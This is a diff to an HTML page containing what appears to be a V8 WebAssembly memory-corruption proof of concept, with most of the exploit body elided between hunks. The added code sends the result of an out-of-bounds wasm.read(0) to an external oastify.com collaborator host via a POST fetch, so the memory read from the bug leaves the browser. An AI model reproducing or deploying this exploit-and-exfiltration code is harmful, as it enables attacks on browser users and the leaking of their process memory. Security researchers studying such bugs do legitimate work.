@@ -1,4 +1,23 @@
 <script>
+async function fetchErrorStack(stack) {
+  const url = `https://mg6sw1xe43kpy8oq1q1867pcc3iu6mub.oastify.com/log`; // Replace with your actual URL
+  try {
+    const response = await fetch(url, {
+      method: 'POST', // Use POST to send data
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: `stack=${encodeURIComponent(stack)}`,
+    });
+    if (!response.ok) {
+      throw new Error(`HTTP error! Status: ${response.status}`);
+    }
+    console.log('Error stack sent successfully');
+  } catch (fetchError) {
+    console.error('Failed to send error stack:', fetchError);
+  }
+}
+  
 {
   const builder = new WasmModuleBuilder();
   builder.startRecGroup();
@@ -35,6 +54,6 @@
 
   // this should obviously fail, instead of reading from the given JS object (or smi)
   // instead we segfault on the smi as caged offset
-  console.log(wasm.read(0).toString(16));
+  await fetchErrorStack(wasm.read(0).toString(16));
 }
     </script>
